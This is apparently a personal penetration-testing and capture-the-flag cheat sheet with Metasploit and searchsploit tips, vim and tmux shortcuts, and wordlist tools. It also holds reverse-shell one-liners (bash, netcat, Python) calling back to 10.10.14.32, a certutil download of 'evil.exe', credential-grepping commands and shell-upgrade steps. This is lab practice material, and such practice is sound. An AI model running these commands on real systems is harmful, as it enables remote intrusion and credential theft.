---
layout: tips
title: Tips and Tricks
---

Metasploit
==========
Updates
{% highlight bash%}
searchsploit -u
apt  update ; apt install metasploit-framework
{% endhighlight %}
Searchsploit
{% highlight bash%}
searchsploit -m :copy exploit in pwn
searchsploit -e :examine exploit
searchsploit -p :print full path
{% endhighlight %}
Load exploit to msf
{% highlight bash%}
msf > loadpath /usr/share/metasploit-framework/modules/
or
mv exploit.rb ~/.msf4/modules/exploit/exploit.rb and msf > reload_all
{% endhighlight %}

One Liners
==========
Dowloading file via certutil
{% highlight bash%}
cmd.exe /C certutil  -split -urlcache -f http://10.10.14.1/evil.exe c:\Users\Admin\Desktop\notevil.exe
{% endhighlight %}
Nmap scan ran through searchsploit
{% highlight bash%}
nmap -p- -sV -oX new.xml 10.10.14.1; searchsploit --nmap new.xml
{% endhighlight %}
List al started services
{% highlight bash%}
cmd.exe /c wmic service where started=true get name, startname
{% endhighlight %}
Wfuzz
{% highlight bash%}
wfuzz -w /wordlist/directory-medium.txt --hc 404 http://testing.com/test.php?FUZZ=1
--hc 404 = exclude 404 response  
--hh 777 = exclude response with 777char  
For more details: [wfuzz][link15] 
{% endhighlight %}
Find all file in a directory and executing a command.
{% highlight bash%}
find . -type f -exec cat {} \;
{% endhighlight %}
Easy transfert
{% highlight bash%}
base64 -w 0 filetotransfert
echo "iOgogIG1haW4oKQo=" | base64 -d > filename
{% endhighlight %}
Finding writable locations
{% highlight bash%}
find / -type d -writable 2> /dev/null
{% endhighlight %}
Looking for creds in the directory
{% highlight bash%}
Grabbing full word
grep -rnw ./ -e 'password' -e 'password' -e 'passwd'
Grabbing partial word
grep -rn ./ -e 'passwd'
{% endhighlight %}
Search for flag
{% highlight bash%}
find / -type f \( -name "root.txt" -o -name "user.txt" \) 2>/dev/nul
{% endhighlight %}
[Back to the top](#header)

Reverse shells
================
{% highlight bash%}
bash -i >& /dev/tcp/10.10.14.32/9001 0>&1
/bin/sh | nc 10.10.14.32 9001
rm -f /tmp/p; mknod /tmp/p p && nc 10.10.14.32 9001 0/tmp/p
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}
[Back to the top](#header)

Creating Custom Wordlists
=========================
This can be easily achieved using [exrex][link13]:
{% highlight bash%}
python3 exrex.py "(winter|summer|spring|fall|autumn)20[12][678]" -o wordlist
{% endhighlight %}
[Cewl][link14] can also be used to automaticly generate a wordlist by scrapping a website:
{% highlight bash%}
cewl -d 0 https://www.testing.com/
{% endhighlight %}
[Back to the top](#header)

VIM shortcut
=============
{% highlight bash%}
gg            :beginning of the text
dd            :delete line
gg dG         :delete all
g g " + y G   :yank all line 
: % y +       :yank all line (shorter)
{% endhighlight %}
[Back to the top](#header)

Tmux shortcut
=============
{% highlight bash%}
Ctrl + b c :Create window
Ctrl + b , :Rename current window
Ctrl + b % :Split pane vertically
Ctrl + b " :Split pane horizontally
Ctrl + b z :Toggle pane zoom
Ctrl + b ! :Convert pane into a window
Ctrl + b x :Close current pane
Ctrl + b [ :Enter copy mode
  Ctrl + s      :Enable you to search 
                 (press enter to validate and n for next item)
  Ctrl + space  : Start selecting
  Ctrl + w      :Copy selection
  Ctrl + b + ]  :Paste the selection 
  q : Quit copy mode
/ :Search forward
? :Search backward
n :Next keyword occurance
N :Previous keyword occurance
Spacebar   :Start selection
Esc        :Clear selection
Enter      :Copy selection
Ctrl + b ] : Paste contents of buffer_0
{% endhighlight %}
[Back to the top](#header)

Upgrading Simple Shells to Fully Interactive TTYs
=================================================
{% highlight python%}
python -c 'import pty; pty.spawn("/bin/bash")'
or
python3 -c 'import pty; pty.spawn("/bin/bash")'
{% endhighlight %}

Then press CTRL+Z to return to your local shell

{% highlight bash%}
stty -a or (stty size)
stty raw -echo
{% endhighlight %}

Note the number of rows and columns before pressing fg to return to the box

{% highlight bash%}
export SHELL=bash
export TERM=xterm256-color
stty rows number_of_row columns number_of_columns
{% endhighlight %}

Enjoy!
[Back to the top](#header)

Finding non standard binaries 
==============================
{% highlight bash%}
for i in $(ls /sbin/*); do echo $i; done
for i in $(ls /sbin/*); do dpkg --search $i; done
for i in $(ls /sbin/*); do dpkg --search $i 1>/dev/null; done
{% endhighlight %}

To investigate on different location in the $PATH
[Back to the top](#header)

Interesting Links:
==================
- [jwt.io][link1]: Decode and edit jwt token
- [cyberchef][link3]: Decode and encode in multiple format
- [stackedit.io][link4]: Markdown editor
- [devhints.io][link5]: Jekyll dev ops tricks
- [jekyllrb.com][link6]: Jekyll tuto
- [PayloadsAllTheThings][link7]: Payload for everything
- [Netsec][link8]: Idea for future tutorials
- [Pentestmonkey][link9]: Reverse Shell Cheat Sheet
- [W3schools][link10]: Testing new layout
- [Jekyll Tags][link12]: For future reference
[Back to the top](#header)

[link1]:https://jwt.io/  
[link2]:http://jekyllrb.com
[link3]:https://gchq.github.io/CyberChef/
[link4]:https://stackedit.io/app#
[link5]:https://devhints.io/jekyll 
[link6]:https://jekyllrb.com/
[link7]:https://github.com/swisskyrepo/PayloadsAllTheThings
[link8]:https://netsec.ws/?p=376
[link9]:http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
[link10]:https://www.w3schools.com/howto/tryit.asp?filename=tryhow_css_subnav
[link11]:https://github.com/infodox/python-pty-shells
[link12]:https://longqian.me/2017/02/09/github-jekyll-tag/
[link13]:https://github.com/asciimoo/exrex
[link14]:https://digi.ninja/projects/cewl.php
[link15]:https://wfuzz.readthedocs.io/en/latest/user/getting.html#getting-help
